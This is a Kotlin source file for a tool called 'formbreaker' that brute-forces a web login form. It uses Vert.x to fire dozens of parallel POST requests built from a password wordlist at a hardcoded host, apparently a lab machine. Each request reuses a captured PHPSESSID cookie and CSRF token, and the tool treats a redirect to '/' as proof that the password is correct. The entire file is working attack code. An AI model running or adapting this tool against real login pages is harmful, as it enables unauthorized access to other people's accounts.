package com.github.codingchili.formbreaker

import io.vertx.core.AsyncResult
import io.vertx.core.Future
import io.vertx.core.MultiMap
import io.vertx.core.Vertx
import io.vertx.core.buffer.Buffer
import io.vertx.ext.web.client.HttpRequest
import io.vertx.ext.web.client.WebClient
import java.nio.file.Files
import java.nio.file.Paths
import java.time.Instant
import java.time.ZonedDateTime
import java.util.*
import java.util.concurrent.atomic.AtomicInteger

fun main(args: Array<String>) {
    Breaker(args[0], args[1], args[2], args[3])
}

const val PARALLELISM = 64
const val OFFSET = 0

class Breaker(
    var login: String,
    var phpsessid: String,
    var csrf: String,
    wordlist: String,
) {
    var vertx = Vertx.vertx();
    var passwords: List<String> = Files.readAllLines(Paths.get(wordlist), Charsets.ISO_8859_1)
    var index = AtomicInteger(OFFSET)
    var counter = AtomicInteger(0)
    var start = Instant.now().toEpochMilli()

    init {
        log("login=$login sessid=$phpsessid csrf=$csrf wordlist=$wordlist")
        log("starting with $PARALLELISM current requests..")
        log("trying ${passwords.size} passwords..")

        for (i in 0..PARALLELISM) {
            next().ifPresent {
                sender(it)
            }
        }

        vertx.setPeriodic(60_000) {
            val requests = counter.get()
            val left = passwords.size - index.get()
            val time = (left / requests + 1)

            log("$requests requests/min, $left left to try in $time minutes.")
            counter.set(0)
        }
    }

    fun sender(form: MultiMap) {
        val client = WebClient.create(vertx).post(80, "192.168.56.9", "/login")
            .putHeader("Cookie", "PHPSESSID=$phpsessid")
            .followRedirects(false)

        submit(client, form).setHandler {
            handler(it, client)
        }
    }

    fun handler(result: AsyncResult<Boolean>, client: HttpRequest<Buffer>) {
        counter.incrementAndGet()

        if (result.result()) {
            log("shutting down.. {remember to run refresh tokens}")
            vertx.close()
        } else {
            next().ifPresent {
                submit(client, it).setHandler {
                    handler(it, client)
                }
            }
        }
    }

    fun next(): Optional<MultiMap> {
        val index = index.getAndIncrement()

        return if (index < passwords.size) {
            val form = MultiMap.caseInsensitiveMultiMap()
            val password = passwords[index]

            form.add("password", password)
            form.add("_csrf_token", csrf)
            form.add("login", login)

            Optional.of(form)
        } else {
            Optional.empty()
        }
    }

    fun submit(client: HttpRequest<Buffer>, form: MultiMap): Future<Boolean> {
        val future = Future.future<Boolean>()

        client.sendForm(form) {
            it.map { response ->
                response.body()
                val header = response.getHeader("Location")
                if (header == "/") {
                    val seconds = (Instant.now().toEpochMilli() - start) / 1000
                    val password = form.get("password")

                    log("Found password '$password' in $seconds seconds.)");
                    future.complete(true)
                } else {
                    future.complete(false)
                }
            }
        }
        return future
    }

    fun log(text: String) {
        println("${ZonedDateTime.now()}: $text")
    }
}